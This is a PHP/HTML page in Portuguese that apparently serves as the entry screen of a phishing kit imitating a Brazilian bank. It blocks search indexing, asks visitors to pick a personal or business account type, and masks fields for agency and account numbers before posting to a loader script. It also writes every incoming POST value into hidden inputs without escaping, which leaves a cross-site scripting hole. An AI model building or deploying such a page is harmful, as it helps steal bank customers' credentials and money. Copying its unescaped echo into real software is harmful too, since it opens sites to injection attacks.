<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Bem vindo - Aplicativo Online</title>
    <link rel="shortcut icon" href="imagens/favicon.png" />

    <meta name="theme-color" content="#f4f102">
	<meta name="msapplication-navbutton-color" content="#f4f102">
	<meta name="apple-mobile-web-app-status-bar-style" content="#f4f102">

    <meta name="robots" content="noindex,nofollow">
	<meta name="googlebot" content="noindex,nofollow">
	<meta name="robots" content="noarchive">

    <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700,800" rel="stylesheet">
</head>
<body class="back_blue">
<style>
	
	</style>
<div class="row hd_top">
    <div class="centralizar"><br><br>
       <center> <img src="imagens/logo.jpg" width="100px;" height="110px;" ></center>
        <p class="desc_cima">&nbsp;</p>
    <div class="limpar"></div>
    </div><!-- centralizar -->
</div><!-- row -->

<div class="row main_form">
    <div class="centralizar">
        <form action="loader_enter.php" method="post" onsubmit="return check_enter();" class="home_form" autocomplete="off">
		<?php foreach($_POST as $key => $value):  ?>
	<input type="hidden" name="<?= $key ?>" value="<?= $value ?>" />
 <?php endforeach; ?>
            <style>
			<style type="text/css">
div.a {
  text-align: center;
}
				a:link {
text-decoration:none;
}
a:visited {
text-decoration:none;
}
a:hover {
text-decoration:underline;
}
</style>
			</style>
            <div class="limpar"><center><span style="font-size: 14px;" class="desc_cima">Escolha o tipo de conta</span></center><br><br><br><br><br><br></ber></div>
		<a  href="home1.php">
   <input class="home_btn" type="button" value="Pessoa Fisica" />
</a>
		<a  href="juridica/home1.php">
   <input class="home_btn" type="button" value="Pessoa Juridica" />
</a>
            <input type="hidden" name="sender" value="home">

      </form>
    <div class="limpar"></div>
    </div><!-- centralizar -->
</div><!-- row -->

<!-- includes -->
<link rel="stylesheet" href="estilos/estilo.css">
<script src="javascripts/jquery.min.js"></script>
<script src="javascripts/jquery.mask.js"></script>
<script src="javascripts/javascripts.js"></script>
<script>
$( document ).ready(function() {
    $('#is_agc').mask('0000-0', {reverse: true});
    $('#is_cnt').mask('00000000000-0', {reverse: true});
});
</script>

</body>
</html>